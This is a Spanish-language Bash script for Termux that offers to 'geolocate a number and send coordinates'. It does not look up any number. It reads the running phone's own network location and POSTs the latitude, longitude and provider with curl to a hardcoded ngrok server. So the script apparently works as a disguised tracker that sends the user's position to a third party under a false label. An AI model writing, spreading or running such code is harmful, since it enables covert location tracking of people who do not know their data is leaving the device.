#!/bin/bash

while true; do
    echo "1. Geolocalizar número y enviar coordenadas"
    echo "2. Salir"

    read -p "Selecciona una opción: " opcion

    case $opcion in
        1)
            # Obtener las coordenadas de geolocalización reales del dispositivo
            loc=$(termux-location -p network)

            latitud=$(echo "$loc" | jq -r '.latitude')
            longitud=$(echo "$loc" | jq -r '.longitude')
            geolocalizacion=$(echo "$loc" | jq -r '.provider')

            # Enviar las coordenadas y geolocalización al servidor a través de Ngrok
            curl -X POST -d "latitud=$latitud&longitud=$longitud&geolocalizacion=$geolocalizacion" https://5fdc-186-166-142-157.ngrok-free.app/
            echo "Coordenadas y geolocalización enviadas al servidor."

            ;;
        2)
            echo "Saliendo del script."
            break
            ;;
        *)
            echo "Opción no válida. Por favor selecciona 1 o 2."
            ;;
    esac
done